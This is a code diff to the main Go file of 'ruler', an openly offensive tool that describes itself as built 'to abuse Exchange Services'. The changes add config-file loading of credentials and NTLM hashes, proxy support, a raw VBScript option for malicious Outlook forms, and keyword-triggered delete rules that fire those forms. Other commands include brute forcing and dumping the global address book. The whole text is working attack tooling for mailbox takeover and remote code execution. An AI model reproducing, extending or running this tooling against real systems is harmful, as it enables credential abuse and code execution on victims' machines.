@@ -179,12 +179,8 @@ func sendMessage(subject, body string) error {
 //Function to connect to the Exchange server
 func connect(c *cli.Context) error {
 	var err error
-	//check that name, trigger and location were supplied
-	if c.GlobalString("email") == "" && c.GlobalString("username") == "" {
-		return fmt.Errorf("Missing global argument. Use --domain (if needed), --username and --email")
-	}
 	//if no password or hash was supplied, read from stdin
-	if c.GlobalString("password") == "" && c.GlobalString("hash") == "" {
+	if c.GlobalString("password") == "" && c.GlobalString("hash") == "" && c.GlobalString("config") == "" {
 		fmt.Printf("Password: ")
 		var pass []byte
 		pass, err = gopass.GetPasswd()
@@ -203,16 +199,14 @@ func connect(c *cli.Context) error {
 	//setup our autodiscover service
 	config.Domain = c.GlobalString("domain")
 	config.User = c.GlobalString("username")
-
 	config.Email = c.GlobalString("email")
-
 	config.Basic = c.GlobalBool("basic")
 	config.Insecure = c.GlobalBool("insecure")
 	config.Verbose = c.GlobalBool("verbose")
 	config.Admin = c.GlobalBool("admin")
 	config.RPCEncrypt = !c.GlobalBool("noencrypt")
 	config.CookieJar, _ = cookiejar.New(nil)
-
+	config.Proxy = c.GlobalString("proxy")
 	//add supplied cookie to the cookie jar
 	if c.GlobalString("cookie") != "" {
 		//split into cookies and then into name : value
@@ -280,36 +274,87 @@ func connect(c *cli.Context) error {
 	var resp *utils.AutodiscoverResp
 	var rawAutodiscover string
 
-	//unless user specified nocache, check cache for existing autodiscover
-	if c.GlobalBool("nocache") == false {
-		resp = autodiscover.CheckCache(config.Email)
-	}
+	var mapiURL, abkURL, userDN string
 
-	//var err error
 	//try connect to MAPI/HTTP first -- this is faster and the code-base is more stable
 	//unless of course the global "RPC" flag has been set, which specifies we should just use
 	//RPC/HTTP from the get-go
-	if !c.GlobalBool("rpc") {
-		var mapiURL, abkURL, userDN string
+	if c.GlobalString("config") != "" {
+		var yamlConfig utils.YamlConfig
+		if yamlConfig, err = utils.ReadYml(c.GlobalString("config")); err != nil {
+			utils.Error.Println("Invalid Config file.")
+			return err
+		}
 
-		resp, rawAutodiscover, err = autodiscover.GetMapiHTTP(config.Email, url, resp)
-		if err != nil {
-			exit(err)
+		//set all fields from yamlConfig into config (this overrides cmdline options)
+		if yamlConfig.Username != "" {
+			config.User = yamlConfig.Username
+		}
+		if yamlConfig.Password != "" {
+			config.Pass = yamlConfig.Password
+		}
+		if yamlConfig.Email != "" {
+			config.Email = yamlConfig.Email
+		}
+		if yamlConfig.Hash != "" {
+			if config.NTHash, err = hex.DecodeString(yamlConfig.Hash); err != nil {
+				return fmt.Errorf("Invalid hash provided. Hex decode failed")
+			}
+		}
+
+		if config.User == "" && config.Email == "" {
+			return fmt.Errorf("Missing username and/or email argument. Use --domain (if needed), --username and --email or the --config")
+		}
+
+		if config.Pass == "" {
+			fmt.Printf("Password: ")
+			var pass []byte
+			pass, err = gopass.GetPasswd()
+			if err != nil {
+				// Handle gopass.ErrInterrupted or getch() read error
+				return fmt.Errorf("Password or hash required. Supply NTLM hash with --hash")
+			}
+			config.Pass = string(pass)
+		}
+
+		if yamlConfig.RPC == true {
+			//create RPC URL
+			config.RPCURL = fmt.Sprintf("%s?%s:6001", yamlConfig.RPCURL, yamlConfig.Mailbox)
+			config.RPCEncrypt = yamlConfig.RPCEncrypt
+			config.RPCNtlm = yamlConfig.Ntlm
+		} else {
+			mapiURL = fmt.Sprintf("%s?MailboxId=%s", yamlConfig.MapiURL, yamlConfig.Mailbox)
+		}
+		userDN = yamlConfig.UserDN
+
+	} else if !c.GlobalBool("rpc") {
+
+		if config.User == "" && config.Email == "" {
+			return fmt.Errorf("Missing username and/or email argument. Use --domain (if needed), --username and --email or the --config")
+		}
+
+		if c.GlobalBool("nocache") == false { //unless user specified nocache, check cache for existing autodiscover
+			resp = autodiscover.CheckCache(config.Email)
+		}
+		if resp == nil {
+			resp, rawAutodiscover, err = autodiscover.GetMapiHTTP(config.Email, url, resp)
+			if err != nil {
+				exit(err)
+			}
 		}
 		mapiURL = mapi.ExtractMapiURL(resp)
 		abkURL = mapi.ExtractMapiAddressBookURL(resp)
 		userDN = resp.Response.User.LegacyDN
 
 		if mapiURL == "" { //try RPC
-			//fmt.Println("No MAPI URL found. Trying RPC/HTTP")
-			resp, _, config.RPCURL, config.RPCMailbox, config.RPCNtlm, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
+			resp, rawAutodiscover, config.RPCURL, config.RPCMailbox, config.RPCNtlm, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
 			if err != nil {
 				exit(err)
 			}
 			if resp.Response.User.LegacyDN == "" {
 				return fmt.Errorf("Both MAPI/HTTP and RPC/HTTP failed. Are the credentials valid? \n%s", resp.Response.Error)
 			}
-			mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
+
 			if c.GlobalBool("nocache") == false {
 				autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
 			}
@@ -318,22 +363,39 @@ func connect(c *cli.Context) error {
 			utils.Trace.Println("MAPI URL found: ", mapiURL)
 			utils.Trace.Println("MAPI AddressBook URL found: ", abkURL)
 
-			mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
+			//mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
 			if c.GlobalBool("nocache") == false {
 				autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
 			}
 		}
 
 	} else {
+
+		if config.User == "" && config.Email == "" {
+			return fmt.Errorf("Missing username and/or email argument. Use --domain (if needed), --username and --email or the --config")
+		}
+
 		utils.Trace.Println("RPC/HTTP forced, trying RPC/HTTP")
+		if c.GlobalBool("nocache") == false { //unless user specified nocache, check cache for existing autodiscover
+			resp = autodiscover.CheckCache(config.Email)
+		}
+
 		resp, rawAutodiscover, config.RPCURL, config.RPCMailbox, config.RPCNtlm, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
 		if err != nil {
 			exit(err)
 		}
-		mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
+
+		userDN = resp.Response.User.LegacyDN
+
 		if c.GlobalBool("nocache") == false {
 			autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
 		}
+	}
+
+	if config.RPCURL != "" {
+		mapi.Init(&config, userDN, "", "", mapi.RPC)
+	} else {
+		mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
 	}
 
 	//now we should do the login
@@ -497,7 +559,20 @@ func createForm(c *cli.Context) error {
 	suffix := c.String("suffix")
 	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
 
-	msgid, err := forms.CreateFormMessage(suffix)
+	utils.Trace.Println("Verifying that form does not exist.")
+	//check that form does not already exist
+	if err := forms.CheckForm(folderid, suffix); err != nil {
+		return err
+	}
+	var rname, triggerword string
+	if c.Bool("rule") == true {
+		rname = utils.GenerateString(6)
+		triggerword = utils.GenerateString(8)
+	} else {
+		rname = "NORULE"
+	}
+
+	msgid, err := forms.CreateFormMessage(suffix, rname)
 	if err != nil {
 		return err
 	}
@@ -505,24 +580,30 @@ func createForm(c *cli.Context) error {
 	if err := forms.CreateFormAttachmentPointer(folderid, msgid); err != nil {
 		return err
 	}
-	if err := forms.CreateFormAttachmentTemplate(folderid, msgid, command); err != nil {
-		return err
+	if c.Bool("raw") == true {
+		if err := forms.CreateFormAttachmentForDeleteTemplate(folderid, msgid, command); err != nil {
+			return err
+		}
+	} else {
+		if err := forms.CreateFormAttachmentTemplate(folderid, msgid, command); err != nil {
+			return err
+		}
 	}
 	utils.Info.Println("Form created successfully")
 
 	if c.Bool("rule") == true {
-		rname := utils.GenerateString(6)
 		utils.Info.Printf("Rule trigger set. Adding new rule with name %s\n", rname)
-		triggerword := utils.GenerateString(8)
 		utils.Info.Printf("Adding new rule with trigger of %s\n", triggerword)
-		if c.Bool("send") == false {
-			utils.Info.Printf("Autosend disabled. You'll need to trigger the rule by sending an email with the keyword \"%s\" present in the subject. \n", triggerword)
-		}
+
 		//create delete rule
 		if _, err := mapi.ExecuteDeleteRuleAdd(rname, triggerword); err != nil {
 			utils.Error.Println("Failed to create the trigger rule")
 		} else {
 			utils.Info.Println("Trigger rule created.")
+		}
+
+		if c.Bool("send") == false {
+			utils.Info.Printf("Autosend disabled. You'll need to trigger the rule by sending an email with the keyword \"%s\" present in the subject. \n", triggerword)
 		}
 		c.Set("subject", triggerword)
 	}
@@ -539,7 +620,7 @@ func triggerForm(c *cli.Context) error {
 	body := c.String("body")
 	suffix := c.String("suffix")
 	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
-	target := c.GlobalString("email")
+	target := mapi.AuthSession.Email
 
 	utils.Trace.Println("Creating Trigger message.")
 	msgid, err := forms.CreateFormTriggerMessage(suffix, subject, body)
@@ -567,7 +648,7 @@ func deleteForm(c *cli.Context) error {
 		utils.Error.Println("Failed to delete form.")
 		return err
 	}
-	utils.Info.Println("Form deleted successfully.")
+
 	return nil
 }
 
@@ -584,9 +665,10 @@ func displayForms(c *cli.Context) error {
 func main() {
 
 	app := cli.NewApp()
+
 	app.Name = "ruler"
 	app.Usage = "A tool to abuse Exchange Services"
-	app.Version = "2.1.3"
+	app.Version = "2.1.6"
 	app.Author = "Etienne Stalmans <etienne@sensepost.com>, @_staaldraad"
 	app.Description = `         _
  _ __ _   _| | ___ _ __
@@ -632,9 +714,19 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 			Usage: "Any third party cookies such as SSO that are needed",
 		},
 		cli.StringFlag{
+			Name:  "config",
+			Value: "",
+			Usage: "The path to a config file to use",
+		},
+		cli.StringFlag{
 			Name:  "url",
 			Value: "",
 			Usage: "If you know the Autodiscover URL or the autodiscover service is failing. Requires full URI, https://autodisc.d.com/autodiscover/autodiscover.xml",
+		},
+		cli.StringFlag{
+			Name:  "proxy",
+			Value: "",
+			Usage: "If you need to use an upstream proxy. Works with https://user:pass@ip:port or https://ip:port",
 		},
 		cli.BoolFlag{
 			Name:  "insecure,k",
@@ -664,13 +756,21 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 			Name:  "verbose",
 			Usage: "Be verbose and show some of thei inner workings",
 		},
+		cli.BoolFlag{
+			Name:  "debug",
+			Usage: "Be print debug info",
+		},
 	}
 
 	app.Before = func(c *cli.Context) error {
-		if c.Bool("verbose") == true {
+		if c.Bool("verbose") == true && c.Bool("debug") == false {
+			utils.Init(os.Stdout, os.Stdout, ioutil.Discard, os.Stderr)
+		} else if c.Bool("verbose") == false && c.Bool("debug") == true {
+			utils.Init(ioutil.Discard, os.Stdout, os.Stdout, os.Stderr)
+		} else if c.Bool("debug") == true {
 			utils.Init(os.Stdout, os.Stdout, os.Stdout, os.Stderr)
 		} else {
-			utils.Init(ioutil.Discard, os.Stdout, os.Stdout, os.Stderr)
+			utils.Init(ioutil.Discard, os.Stdout, ioutil.Discard, os.Stderr)
 		}
 		return nil
 	}
@@ -715,11 +815,13 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 				//check that name, trigger and location were supplied
 				if c.String("name") == "" || c.String("trigger") == "" || c.String("location") == "" {
 					cli.NewExitError("Missing rule item. Use --name, --trigger and --location", 1)
+					cli.OsExiter(1)
 				}
 
 				err := connect(c)
 				if err != nil {
-					return cli.NewExitError(err, 1)
+					utils.Error.Println(err)
+					cli.OsExiter(1)
 				}
 				err = addRule(c)
 				exit(err)
@@ -750,7 +852,8 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 				}
 				err := connect(c)
 				if err != nil {
-					return cli.NewExitError(err, 1)
+					utils.Error.Println(err)
+					cli.OsExiter(1)
 				}
 				err = deleteRule(c)
 
@@ -766,7 +869,8 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 			Action: func(c *cli.Context) error {
 				err := connect(c)
 				if err != nil {
-					return cli.NewExitError(err, 1)
+					utils.Error.Println(err)
+					cli.OsExiter(1)
 				}
 				err = displayRules(c)
 				exit(err)
@@ -781,7 +885,8 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 			Action: func(c *cli.Context) error {
 				err := connect(c)
 				if err != nil {
-					return cli.NewExitError(err, 1)
+					utils.Error.Println(err)
+					cli.OsExiter(1)
 				}
 				utils.Info.Println("Looks like we are good to go!")
 				return nil
@@ -810,7 +915,8 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 				}
 				err := connect(c)
 				if err != nil {
-					return cli.NewExitError(err, 1)
+					utils.Error.Println(err)
+					cli.OsExiter(1)
 				}
 				err = sendMessage(c.String("subject"), c.String("body"))
 				exit(err)
@@ -859,7 +965,8 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 			Action: func(c *cli.Context) error {
 				err := brute(c)
 				if err != nil {
-					return cli.NewExitError(err, 1)
+					utils.Error.Println(err)
+					cli.OsExiter(1)
 				}
 				return nil
 			},
@@ -874,12 +981,11 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 					Action: func(c *cli.Context) error {
 						err := connect(c)
 						if err != nil {
-							return cli.NewExitError(err, 1)
+							utils.Error.Println(err)
+							cli.OsExiter(1)
 						}
 						err = abkList(c)
-						if err != nil {
-							return cli.NewExitError(err, 1)
-						}
+						exit(err)
 						return nil
 					},
 				},
@@ -899,12 +1005,11 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 						}
 						err := connect(c)
 						if err != nil {
-							return cli.NewExitError(err, 1)
+							utils.Error.Println(err)
+							cli.OsExiter(1)
 						}
 						err = abkDump(c)
-						if err != nil {
-							return cli.NewExitError(err, 1)
-						}
+						exit(err)
 						return nil
 					},
 				},
@@ -938,6 +1043,10 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 							Usage: "Trigger the form once it's been created.",
 						},
 						cli.BoolFlag{
+							Name:  "raw",
+							Usage: "Use a blank template allowing Raw VBScript.",
+						},
+						cli.BoolFlag{
 							Name:  "rule,r",
 							Usage: "Trigger the form with a rule. This will add a new rule!",
 						},
@@ -963,12 +1072,11 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 
 						err := connect(c)
 						if err != nil {
-							return cli.NewExitError(err, 1)
+							utils.Error.Println(err)
+							cli.OsExiter(1)
 						}
 						err = createForm(c)
-						if err != nil {
-							return cli.NewExitError(err, 1)
-						}
+						exit(err)
 						return nil
 					},
 				},
@@ -1004,12 +1112,11 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 
 						err := connect(c)
 						if err != nil {
-							return cli.NewExitError(err, 1)
+							utils.Error.Println(err)
+							cli.OsExiter(1)
 						}
 						err = triggerForm(c)
-						if err != nil {
-							return cli.NewExitError(err, 1)
-						}
+						exit(err)
 						return nil
 					},
 				},
@@ -1030,12 +1137,11 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 
 						err := connect(c)
 						if err != nil {
-							return cli.NewExitError(err, 1)
+							utils.Error.Println(err)
+							cli.OsExiter(1)
 						}
 						err = deleteForm(c)
-						if err != nil {
-							exit(err)
-						}
+						exit(err)
 						return nil
 					},
 				},
@@ -1047,12 +1153,11 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 
 						err := connect(c)
 						if err != nil {
-							return cli.NewExitError(err, 1)
+							utils.Error.Println(err)
+							cli.OsExiter(1)
 						}
 						err = displayForms(c)
-						if err != nil {
-							exit(err)
-						}
+						exit(err)
 						return nil
 					},
 				},
